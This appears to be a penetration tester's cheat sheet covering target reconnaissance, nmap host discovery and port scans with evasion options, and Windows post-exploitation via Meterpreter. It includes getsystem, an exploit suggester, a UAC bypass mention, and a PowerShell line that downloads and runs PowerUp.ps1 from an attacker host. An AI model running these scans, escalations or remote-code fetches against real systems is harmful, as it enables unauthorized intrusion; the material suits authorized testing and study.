# Information Gathering
### Business
### Infrastructure
##### [Gather DNS Names and Public IPs](https://nmap.org/book/host-discovery-find-ips.html)
Confirm that any hosts found in this phase actually belong to the target, so as not to illegally scan or hack someone else.

* Perform whois on IP Address to get Net Block
```bash
whois <IP Address>
```
* [Look-up the CIDR from whois to get the Autonomous System Number](https://asn.cymru.com/cgi-bin/whois.cgi)
* [Find all of the IP prefixes which route to the AS Number](https://www.robtex.com/as/)

# Scanning
### Host Discovery 
##### Internet
* Simple Scan
```bash
sudo nmap -n -sn -g 53 -T4 -iL [Hosts File] | grep "Nmap scan report for" | cut -d ' ' -f5 > InternetDefaultPing
```
* [Extra probes to find more hosts](https://nmap.org/book/host-discovery-strategies.html)
```bash
sudo nmap -n -sn -g 53 -PE -PP -PS21,22,23,25,80,113,443,31339 -PA80,113,443,10042 -PU161,40125 -T4 -iL [Hosts File] | grep "Nmap scan report for" | cut -d ' ' -f5 > InternetExtendedPing
```
##### LAN
* [Simple Scan](https://nmap.org/book/host-discovery-techniques.html#host-discovery-default)
```bash
# Allow Reverse DNS to help identify candidates to exclude.
# Specify source port as DNS.
# Call as sudo to allow for default -sn options of -PE -PS443 -PA80 -PP.
# Otherwise, nmap can only send SYN packets.

# Look like Windows machine
sudo nmap -sn -g 53 --data-length 32 [Target Host]/[Network ID] --ttl 2 --randomize-hosts --reason --exclude [Attack Host] -oA LanDefaultPing

# Look like Linux maching
sudo nmap -sn -g 53 --data-length 56 [Target Host]/[Network ID] --ttl 2 --randomize-hosts --reason --exclude [Attack Host] -oA LanDefaultPing
```

### Scan Ports
##### Open Ports
* Basic Scan
```bash
sudo nmap -sS --open -p0- <Target Host> -oA TcpOpenPorts
sudo nmap -sUV --version-intensity 0 --open <Target Host> -oA UdpOpenPorts
```
* [FIN, NULL, and Xmas Scans](https://nmap.org/book/scan-methods-null-fin-xmas-scan.html)
* [Custom Scan Types](https://nmap.org/book/scan-methods-custom-scanflags.html)
* [ACK Scan](https://nmap.org/book/scan-methods-ack-scan.html)
* [Window Scan](https://nmap.org/book/scan-methods-window-scan.html)
* [Maimon Scan](https://nmap.org/book/scan-methods-maimon-scan.html)
* [Idle Scan](https://nmap.org/book/idlescan.html)

##### Fingerprint Ports

### [Scan Protocol](https://nmap.org/book/scan-methods-ip-protocol-scan.html)
### [FTP Bounce Scan](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)

# Post Exploitation
### Windows
* Meterpreter - Migrate process.
* Meterpreter - ```getuid```
* Meterpreter - ```sysinfo```
* Meterpreter - ```getsystem```
* Meterpreter Suggester - ```post/multi/recon/local_exploit_suggester```.
* Check users in Administrators - ```net localgroup administrators```.
* Bypass UAC
* PowerUp.ps1
```bash
meterpreter > load powershell
meterpreter > powershell_shell
iex (New-Object Net.WebClient).DownloadString('http://[Attack Host]/PowerUp.ps1')
Invoke-AllChecks
```